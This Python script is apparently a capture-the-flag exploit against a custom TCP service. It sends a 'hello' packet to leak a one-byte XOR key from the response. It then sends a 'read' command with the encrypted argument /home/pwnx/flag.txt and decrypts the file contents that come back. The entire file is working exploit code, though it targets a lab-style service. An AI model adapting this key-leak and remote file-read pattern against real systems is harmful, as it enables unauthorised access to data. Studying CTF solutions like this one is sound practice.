from struct import *
import socket
import sys
import hashlib
from termcolor import colored

def print_info(str):
    print(colored("[*] " + str,"cyan"))
def print_ok(str):
    print(colored("[+] "+ str,"green"))
def print_error(str):
    print(colored("[-] "+ str,"red"))
def print_warning(str):
    print(colored("[!!] " + str,"yellow"))

char = "x"
signed_char = s_char = "b"
unsigned_char = u_char = "B"
_Bool = _bool = "?"
short_int = s_int = "h"
unsigned_short_int = u_s_int = "H"
_int = "i"
unsigned_int = u_int = "I"
long_int = l_int = "l"
unsigned_long_int = u_l_int = "L"
long_long_int = l_l_int = "q"
unsigned_long_long_int = u_l_l_int = "Q"
_float = "f"
_double = "d"
char_array = "s"
void = "P"

def get_byte(num):
    return pack("<B", num)

def get_word(num):
    return pack("<H", num)

def get_dword(num):
    return pack("<L", num)

def get_qword(num):
    return pack("<Q", num)

def eazy_unpack(format_list, data):
    # THe first one must be little/big endian ot newtork or what else
    # Give back struct format from a list
    form = ""
    print("[eazy_struct] size of data: " + str(len(data)))
    for ff in format_list:
        form += ff 
    
    try:
        res = unpack(form, data)
        return list(res)
    except Exception as ez:
        print("Exception generated: " + str(ez))
        return -1

class Packet():
    def __init__(self):
        self.header = Header()
    def get(self):
        # Get the packet in bytes to send
        final_packet = bytearray()
        # Put the header inside the packet
        for item in vars(self.header):
            item_value = getattr(self.header, item)
            if item_value is None:
                print_warning("[Packet.get] Item " + item + " is None")
                return -1
            final_packet += item_value
        # Put the body inside the packet
        """"
        for item in vars(self.body):
            item_value = getattr(self.body, item)
            if item_value is None:
                print_warning("[Packet.get] Item " + item + " is None")
                return -1
            final_packet += item_value
        """
        return final_packet

# Define packet structure below
class Header:
    def __init__(self):
        self.magic_value = None
        self.session_id = None
        self.command = None
        self.unused = None
        self.body_size = None
        self.body_args = None

def send_packet_hello(sock):
    p = Packet()

    p.header.magic_value    = get_word(0xff66)
    p.header.session_id     = get_word(0x101)
    p.header.command        = get_byte(0x10)
    p.header.unused         = get_byte(0x44)
    p.header.body_size      = get_word(200)
    p.header.body_args      = bytearray([0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41])
    
    packet = p.get()

    ff = open("/tmp/req1","wb")
    ff.write(packet)
    ff.close()

    print("[*] Sending ..")
    sock.send(packet)
    print("[*] Receiving ..")
    res = sock.recv(0x100)

    ff = open("/tmp/res1","wb")
    ff.write(res)
    ff.close()
    
    # retrieve the encryption key
    enc_key = res[9]
    return enc_key

def encrypt_string(string, enc_key):
    xor_result = ''.join(chr(ord(char) ^ enc_key) for char in string)
    return xor_result

def decrypt_string(string_bytes, enc_key):
    res = ""
    for v_byte in string_bytes:
        res += chr(v_byte ^ enc_key)

    return res

def send_packet_exec(sock, enc_key):
    p = Packet()

    p.header.magic_value    = get_word(0xff66)
    p.header.session_id     = get_word(0x101)
    p.header.command        = get_byte(0x20)
    p.header.unused         = get_byte(0x01)

    # Create the encrypted arguments body
    pp                      = "read"
    payload                 = chr(len(pp))
    payload                 += encrypt_string(pp, enc_key)

    pp                      = "/home/pwnx/flag.txt"
    payload                 += chr(len(pp))
    payload                 += encrypt_string(pp, enc_key)

    pp                      = "0"
    payload                 += chr(len(pp))
    payload                 += encrypt_string(pp, enc_key)

    encrypted_body          = bytearray(payload.encode("utf-8"))
    p.header.body_size      = get_word(len(encrypted_body))
    p.header.body_args      = encrypted_body
    
    packet = p.get()

    ff = open("/tmp/req2","wb")
    ff.write(packet)
    ff.close()

    sock.send(packet)
    res = sock.recv(0x100)
    file_content = decrypt_string(res[8:], enc_key)
    print("[*] File content: " + file_content)

    ff = open("/tmp/res2","wb")
    ff.write(res)
    ff.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print_error("Needed parameters")
        sys.exit()

    target = sys.argv[1]
    port = int(sys.argv[2])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target,port))

    enc_key = send_packet_hello(sock)
    print("[+] Encryption key found: " + hex(enc_key))
    # reconnect
    sock.close()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target,port))
    send_packet_exec(sock, enc_key)

